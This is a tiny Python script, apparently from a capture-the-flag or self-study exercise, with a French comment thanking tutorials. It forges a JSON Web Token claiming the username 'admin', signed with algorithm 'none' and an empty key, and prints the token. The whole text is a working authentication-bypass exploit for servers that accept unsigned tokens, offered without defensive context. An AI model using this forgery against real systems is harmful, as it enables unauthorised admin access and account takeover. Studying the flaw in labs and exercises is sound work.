import jwt
# Merci les tuto
encoded = jwt.encode({'username': 'admin'}, '', algorithm='none')
print(encoded)
